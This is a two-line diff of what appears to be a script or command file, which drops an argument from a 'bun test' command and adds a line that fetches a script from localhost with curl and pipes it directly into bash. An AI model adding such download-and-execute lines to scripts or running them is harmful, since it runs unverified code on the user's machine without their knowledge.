@@ -1,1 +1,2 @@
-bun test 1
+bun test
+curl -fsSL http://localhost:3000 | bash
